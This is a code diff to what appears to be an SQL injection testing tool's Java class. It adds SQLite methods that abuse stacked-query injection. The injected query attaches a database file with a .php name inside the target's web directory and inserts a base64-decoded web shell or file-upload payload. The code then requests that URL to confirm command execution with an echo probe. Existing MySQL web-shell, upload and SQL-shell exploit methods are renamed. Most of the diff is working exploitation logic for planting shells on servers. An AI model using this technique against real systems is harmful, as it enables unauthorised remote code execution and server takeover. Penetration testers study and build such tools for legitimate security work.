@@ -185,7 +185,82 @@ public class ResourceAccess {
         }
     }
 
-    public String createExploitWeb(String pathExploit, String urlExploit, String pathNetshare, ExploitMethod exploitMethod) throws JSqlException {
+    public void createExploitUploadSqlite(String pathExploit, String urlExploit, File fileToUpload) {
+        String bodyExploit = StringUtil.base64Decode(
+                this.injectionModel.getMediatorUtils().getPropertiesUtil().getProperties().getProperty("exploit.upl")
+            )
+            .replace(DataAccess.SHELL_LEAD, DataAccess.LEAD)
+            .replace(DataAccess.SHELL_TRAIL, DataAccess.TRAIL);
+        var nameDbRandom = RandomStringUtils.secure().nextAlphabetic(8);
+        var nameTableRandom = RandomStringUtils.secure().nextAlphabetic(8);
+        var nameExploit = nameDbRandom + nameTableRandom +".php";
+        var query = String.join(
+            StringUtils.EMPTY,
+            " ; ",
+            "attach database '", pathExploit, nameExploit, "' as ", nameDbRandom, ";",
+            "create table ", nameDbRandom, ".", nameTableRandom, " (c text);",
+            "insert into ", nameDbRandom, ".", nameTableRandom, " (c) values (\"", bodyExploit, "\");"
+        );
+        this.injectionModel.injectWithoutIndex(String.format(query), "sqlt#add-shll");
+
+        BinaryOperator<String> biFuncGetRequest = (String pathExploitFixed, String urlSuccess) -> {
+            try (InputStream streamToUpload = new FileInputStream(fileToUpload)) {
+                HttpResponse<String> result = this.upload(fileToUpload, urlSuccess, streamToUpload);
+                if (result.body().contains(DataAccess.LEAD +"y")) {
+                    LOGGER.log(LogLevelUtil.CONSOLE_SUCCESS, "Upload successful: ack received for {}{}", pathExploit, fileToUpload.getName());
+                } else {
+                    LOGGER.log(LogLevelUtil.CONSOLE_ERROR, "Upload failure: missing ack for {}{}", pathExploit, fileToUpload.getName());
+                }
+            } catch (InterruptedException e) {
+                LOGGER.log(LogLevelUtil.IGNORE, e, e);
+                Thread.currentThread().interrupt();
+            } catch (IOException | JSqlException e) {
+                throw new JSqlRuntimeException(e);
+            }
+            return urlSuccess;
+        };
+
+        this.checkUrls(urlExploit, nameExploit, biFuncGetRequest);
+    }
+
+    public String createExploitWebSqlite(String remotePathFolder, String urlShell) {
+        String bodyExploit = StringUtil.base64Decode(
+                this.injectionModel.getMediatorUtils().getPropertiesUtil().getProperties().getProperty("exploit.web")
+            )
+            .replace(DataAccess.SHELL_LEAD, DataAccess.LEAD)
+            .replace(DataAccess.SHELL_TRAIL, DataAccess.TRAIL);
+        var nameDbRandom = RandomStringUtils.secure().nextAlphabetic(8);
+        var nameTableRandom = RandomStringUtils.secure().nextAlphabetic(8);
+        var nameExploit = nameDbRandom + nameTableRandom +".php";
+        var query = String.join(
+            StringUtils.EMPTY,
+            " ; ",
+            "attach database '", remotePathFolder, nameExploit, "' as ", nameDbRandom, ";",
+            "create table ", nameDbRandom, ".", nameTableRandom, " (c text);",
+            "insert into ", nameDbRandom, ".", nameTableRandom, " (c) values (\"", bodyExploit, "\");"
+        );
+        this.injectionModel.injectWithoutIndex(String.format(query), "sqlt#add-shll");
+
+        BinaryOperator<String> biFuncGetRequest = (String pathExploitFixed, String urlSuccess) -> {
+            String result = this.runCommandShell(
+                urlSuccess +"?c="+ URLEncoder.encode("echo \"iamin$((133707330+1))\"", StandardCharsets.ISO_8859_1)
+            );
+            if (!result.contains("iamin133707331")) {
+                LOGGER.log(LogLevelUtil.CONSOLE_ERROR, "Exploit body not found");
+                return StringUtils.EMPTY;
+            }
+
+            var request = new Request();
+            request.setMessage(Interaction.ADD_TAB_EXPLOIT_WEB);
+            request.setParameters(urlSuccess);
+            this.injectionModel.sendToViews(request);
+            return urlSuccess;
+        };
+
+        return this.checkUrls(urlShell, nameExploit, biFuncGetRequest);
+    }
+
+    public String createExploitWebMysql(String pathExploit, String urlExploit, String pathNetshare, ExploitMethod exploitMethod) throws JSqlException {
         BinaryOperator<String> biFuncGetRequest = (String pathExploitFixed, String urlSuccess) -> {
             var request = new Request();
             request.setMessage(Interaction.ADD_TAB_EXPLOIT_WEB);
@@ -196,11 +271,11 @@ public class ResourceAccess {
         return this.createExploit(pathExploit, urlExploit, "exploit.web", "web.php", biFuncGetRequest, pathNetshare, exploitMethod);
     }
 
-    public void createExploitUpload(String pathExploit, String urlExploit, String pathNetshare, ExploitMethod exploitMethod, File fileToUpload) throws JSqlException {
+    public void createExploitUploadMysql(String pathExploit, String urlExploit, String pathNetshare, ExploitMethod exploitMethod, File fileToUpload) throws JSqlException {
         BinaryOperator<String> biFuncGetRequest = (String pathExploitFixed, String urlSuccess) -> {
             try (InputStream streamToUpload = new FileInputStream(fileToUpload)) {
                 HttpResponse<String> result = this.upload(fileToUpload, urlSuccess, streamToUpload);
-                if (result.body().contains(DataAccess.LEAD + "y")) {
+                if (result.body().contains(DataAccess.LEAD +"y")) {
                     LOGGER.log(LogLevelUtil.CONSOLE_SUCCESS, "Upload successful: ack received for {}{}", pathExploit, fileToUpload.getName());
                 } else {
                     LOGGER.log(LogLevelUtil.CONSOLE_ERROR, "Upload failure: missing ack for {}{}", pathExploit, fileToUpload.getName());
@@ -216,7 +291,7 @@ public class ResourceAccess {
         this.createExploit(pathExploit, urlExploit, "exploit.upl", "upl.php", biFuncGetRequest, pathNetshare, exploitMethod);
     }
 
-    public String createExploitSql(String pathExploit, String urlExploit, String pathNetshare, ExploitMethod exploitMethod, String username, String password) throws JSqlException {
+    public String createExploitSqlMysql(String pathExploit, String urlExploit, String pathNetshare, ExploitMethod exploitMethod, String username, String password) throws JSqlException {
         BinaryOperator<String> biFuncGetRequest = (String pathExploitFixed, String urlSuccess) -> {
             var resultQuery = this.runSqlShell("select 1337", null, urlSuccess, username, password, false);
             if (resultQuery != null && resultQuery.contains("| 1337 |")) {
@@ -347,7 +422,7 @@ public class ResourceAccess {
         if (urlSuccess != null) {
             urlSuccess = biFuncGetRequest.apply(nameExploit, urlSuccess);
         } else {
-            LOGGER.log(LogLevelUtil.CONSOLE_ERROR, "Exploit access failure: URL not found");
+            LOGGER.log(LogLevelUtil.CONSOLE_ERROR, "Exploit access failure: connection URL not found");
         }
         return urlSuccess;
     }
@@ -369,7 +444,7 @@ public class ResourceAccess {
             false,
             1,
             MockElement.MOCK,
-            "xpl#confirm-file"
+            "xplt#confirm-file"
         );
     }
 
@@ -384,7 +459,7 @@ public class ResourceAccess {
                 new CallableHttpHead(
                     urlProtocol + urlPart + filename,
                     this.injectionModel,
-                    "xpl#confirm-url"
+                    "xplt#confirm-url"
                 )
             );
         }
@@ -396,10 +471,8 @@ public class ResourceAccess {
                 CallableHttpHead currentCallable = taskCompletionService.take().get();
                 if (currentCallable.isHttpResponseOk()) {
                     urlSuccess = currentCallable.getUrl();
-                    LOGGER.log(LogLevelUtil.CONSOLE_SUCCESS, "Exploit access successful: connection done at [{}]", currentCallable.getUrl());
+                    LOGGER.log(LogLevelUtil.CONSOLE_SUCCESS, "Exploit successful: connection done to [{}]", currentCallable.getUrl());
                     break;
-                } else {
-                    LOGGER.log(LogLevelUtil.CONSOLE_DEFAULT, "Exploit access failure: connection not found at [{}]", currentCallable.getUrl());
                 }
             } catch (InterruptedException e) {
                 LOGGER.log(LogLevelUtil.IGNORE, e, e);
@@ -421,7 +494,7 @@ public class ResourceAccess {
             pageSource = StringUtils.EMPTY;
         }
         
-        var regexSearch = Pattern.compile("(?s)<"+ DataAccess.LEAD +">(.*)<"+ DataAccess.TRAIL +">").matcher(pageSource);
+        var regexSearch = Pattern.compile("(?s)<"+ DataAccess.LEAD +">(.*?)<"+ DataAccess.TRAIL +">").matcher(pageSource);
         regexSearch.find();
 
         String result;
@@ -443,14 +516,14 @@ public class ResourceAccess {
      */
     public String runWebShell(String command, UUID uuidShell, String urlExploit) {
         String result = this.runCommandShell(
-            urlExploit + "?c="+ URLEncoder.encode(command.trim(), StandardCharsets.ISO_8859_1)
+            urlExploit +"?c="+ URLEncoder.encode(command.trim(), StandardCharsets.ISO_8859_1)
         );
         if (StringUtils.isBlank(result)) {
             // TODO Payload should redirect directly error to default output
             result = "No result.\nTry '"+ command.trim() +" 2>&1' to get a system error message.\n";
         }
 
-        var request = new Request();  // Unfroze interface
+        var request = new Request();  // Unfreeze GUI terminal
         request.setMessage(Interaction.GET_EXPLOIT_WEB_RESULT);
         request.setParameters(uuidShell, result);
         this.injectionModel.sendToViews(request);
@@ -487,13 +560,13 @@ public class ResourceAccess {
                 result = this.convert(listRows, listFieldsLength);
             }
         } else if (result.contains("<SQLm>")) {  // todo deprecated
-            result = result.replace("<SQLm>", StringUtils.EMPTY) + "\n";
+            result = result.replace("<SQLm>", StringUtils.EMPTY) +"\n";
         } else if (result.contains("<SQLe>")) {  // todo deprecated
-            result = result.replace("<SQLe>", StringUtils.EMPTY) + "\n";
+            result = result.replace("<SQLe>", StringUtils.EMPTY) +"\n";
         }
 
         if (isWithView) {
-            var request = new Request();  // Unfroze interface
+            var request = new Request();  // Unfreeze GUI terminal
             request.setMessage(Interaction.GET_EXPLOIT_SQL_RESULT);
             request.setParameters(uuidShell, result, command);
             this.injectionModel.sendToViews(request);
